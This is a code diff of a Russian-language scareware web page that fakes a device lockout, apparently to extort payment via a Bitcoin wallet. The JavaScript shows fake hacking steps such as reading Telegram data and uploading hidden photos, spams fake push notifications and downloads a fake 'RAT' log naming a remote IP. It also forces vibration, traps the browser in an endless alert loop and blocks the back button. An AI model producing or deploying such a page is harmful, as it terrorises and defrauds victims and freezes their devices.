@@ -15,7 +15,10 @@
         #scan-details { font-size: 15px; color: #00ff00; height: 60px; text-shadow: 0 0 5px #00ff00; }
 
         #main-alert { display: none; }
-        .devil-img { width: 150px; filter: drop-shadow(0 0 20px red); animation: glitch 0.2s infinite; margin-bottom: 10px; }
+        
+        /* Тут я увеличил твоего демона, чтобы он был большим и страшным */
+        .devil-img { width: 90%; max-width: 500px; filter: drop-shadow(0 0 30px red); animation: glitch 0.2s infinite; margin-bottom: 20px; }
+        
         @keyframes glitch { 
             0% { transform: translate(0); } 
             20% { transform: translate(-3px, 3px); } 
@@ -24,7 +27,7 @@
             80% { transform: translate(3px, -3px); } 
             100% { transform: translate(0); } 
         }
-        .alert-box { background: rgba(0, 0, 0, 0.95); border: 3px solid red; padding: 15px; color: #ff0000; box-shadow: 0 0 30px red; font-size: 13px; text-align: left; }
+        .alert-box { background: rgba(0, 0, 0, 0.95); border: 3px solid red; padding: 15px; color: #ff0000; box-shadow: 0 0 30px red; font-size: 14px; text-align: left; }
         
         .blink { animation: blinker 0.6s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
@@ -32,9 +35,9 @@
         @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); } }
 
         #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: rgba(0,0,0,1); display: flex; justify-content: center; align-items: center; }
-        .start-btn { padding: 20px; font-size: 16px; background: #00ff00; color: black; border: none; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #00ff00; text-transform: uppercase; }
+        .start-btn { padding: 20px; font-size: 18px; background: #00ff00; color: black; border: none; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px #00ff00; text-transform: uppercase; }
         .btc-wallet { color: yellow; word-break: break-all; font-weight: bold; background: #333; padding: 2px; }
-        h2 { margin: 0 0 10px 0; font-size: 20px; text-transform: uppercase; text-align: center; }
+        h2 { margin: 0 0 10px 0; font-size: 22px; text-transform: uppercase; text-align: center; }
         p { margin: 8px 0; line-height: 1.4; }
     </style>
 </head>
@@ -55,7 +58,7 @@
 
         <div id="main-alert">
             <div style="text-align: center;">
-                <img src="https://cdn-icons-png.flaticon.com/512/1053/1053151.png" class="devil-img" alt="DEVIL">
+                <img src="Photoroom_20260211_192331.png" class="devil-img" alt="DEVIL">
             </div>
             <div class="alert-box">
                 <h2 class="blink">УСТРОЙСТВО ЗАБЛОКИРОВАНО</h2>
@@ -91,12 +94,10 @@
             isStarted = true;
             document.getElementById('overlay').style.display = 'none';
             
-            // Запрос уведомлений (для Android это главное)
             if (Notification.permission !== 'granted') {
                 Notification.requestPermission();
             }
             
-            // Полноэкранный режим
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen().catch(() => {});
             }
@@ -115,7 +116,7 @@
 
         function startLoading() {
             const steps = [
-                "Обход защиты Realme OS...",
+                "Обход защиты Redmi OS...",
                 "Получение Root-прав...",
                 "Чтение базы данных Telegram...",
                 "Выгрузка скрытых фото...",
@@ -128,7 +129,7 @@
             ];
 
             const timer = setInterval(() => {
-                prg += 0.8; // Чуть быстрее
+                prg += 0.8; 
                 document.getElementById('progress-bar').style.width = prg + "%";
                 let stepIndex = Math.floor(prg / 10.1);
                 document.getElementById('scan-details').innerText = steps[stepIndex] || "ЗАВЕРШЕНО";
@@ -137,7 +138,6 @@
                     clearInterval(timer);
                     document.getElementById('loading-screen').style.display = 'none';
                     document.getElementById('main-alert').style.display = 'block';
-                    // Длинная вибрация при появлении алерта
                     if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
                 }
             }, 100);
@@ -148,7 +148,7 @@
                 if (Notification.permission === 'granted') {
                     new Notification(title, {
                         body: message,
-                        icon: 'https://cdn-icons-png.flaticon.com/512/1053/1053151.png',
+                        icon: 'Photoroom_20260211_192331.png', 
                         vibrate: [200, 100, 200]
                     });
                 }
@@ -156,7 +156,6 @@
         }
 
         function scareMore() {
-            // Мгновенная реакция на кнопку
             alert("ОШИБКА ДЕАКТИВАЦИИ: Неверный ключ шифрования. Процедура уничтожения запущена.");
             
             const blob = new Blob(["RAT_STATUS: FATAL_ERROR\nTARGET: SYSTEM_WIPE\nREMOTE_IP: 82.202.160.11\nCAMERA: RECORDING"], {type: 'text/plain'});
@@ -165,14 +164,12 @@
             a.download = "SYSTEM_CRASH_LOG.txt";
             a.click();
 
-            // Спам уведомлениями
             if (Notification.permission === 'granted') {
                 sendFakePush("⚠️ SYSTEM ALERT", "Критический сбой Android UI", 1000);
                 sendFakePush("📸 CAMERA", "Фоновая запись начата", 3000);
                 sendFakePush("❌ DATA WIPING", "Форматирование SD-карты...", 6000);
             }
 
-            // Через 2 секунды начинается ад с зависанием
             setTimeout(() => {
                 if(navigator.vibrate) {
                     setInterval(() => {
@@ -180,14 +177,12 @@
                     }, 1000);
                 }
 
-                // Бесконечный цикл ошибок
                 while(true) {
                     alert("CRITICAL ERROR: SYSTEM_HALT\nКод ошибки: 0xDEAD001");
                 }
             }, 2000);
         }
 
-        // Блокировка кнопки "Назад"
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
             history.go(1);
